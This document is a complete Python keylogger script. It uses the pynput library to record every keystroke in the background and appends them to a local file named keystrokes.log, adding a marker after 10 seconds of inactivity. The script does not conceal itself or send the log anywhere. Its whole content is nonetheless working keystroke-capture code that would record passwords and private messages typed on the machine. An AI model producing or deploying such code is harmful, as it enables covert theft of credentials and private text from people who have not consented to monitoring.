from pynput.keyboard import Key, Listener
from threading import Timer
import time
# file_thread = threading.Thread(target=write_to_file, args=None)
# file_thread.start()

no_keystrokes = None

def write_to_file(key):
    if key is not None:
        if key == "alt" or key == "shift" or key == "ctrl":
            pass
        elif key == "enter":
            with open("keystrokes.log", "a") as file:
                file.write("\n")
        else:
            with open("keystrokes.log", "a") as file:
                file.write(key)
    else:
        print("key is none")


def write_inactivity():
    print("Jumping a new line")
    with open("keystrokes.log", "a") as file:
        file.write("10 sec inactivity...")
        file.write("\n")  


def on_press(key):
    global no_keystrokes
    if no_keystrokes is not None:
        no_keystrokes.cancel()
    try:
        key_str = key.char
    except AttributeError:
        # print(f"Spec²ial key {key} pressed")
        key_str = str(key).replace("Key.", "")
    
    write_to_file(key_str)
    
    no_keystrokes = Timer(10, write_inactivity)
    no_keystrokes.start()


# Set up the listener
listener = Listener(on_press=on_press)
listener.start()  # Starts listening in the background

print("3 seconds to go..")
time.sleep(3)
print("Go!")
while True:
    pass
